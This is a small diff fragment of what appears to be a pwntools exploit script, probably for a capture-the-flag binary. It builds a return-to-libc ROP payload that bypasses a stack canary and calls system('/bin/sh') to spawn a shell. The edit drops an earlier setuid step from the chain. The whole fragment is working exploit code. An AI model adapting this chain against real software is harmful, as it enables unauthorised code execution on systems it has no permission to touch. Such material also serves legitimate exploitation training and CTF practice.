@@ -28,8 +28,6 @@ payload = flat(
         canary, 
         b"B"*ret_offset,
         libc.address + pop_rdi,
-        libc.sym['setuid'],
-        libc.address + pop_rdi,
         next(libc.search(b'/bin/sh')),
         libc.address + ret,
         libc.sym['system'],
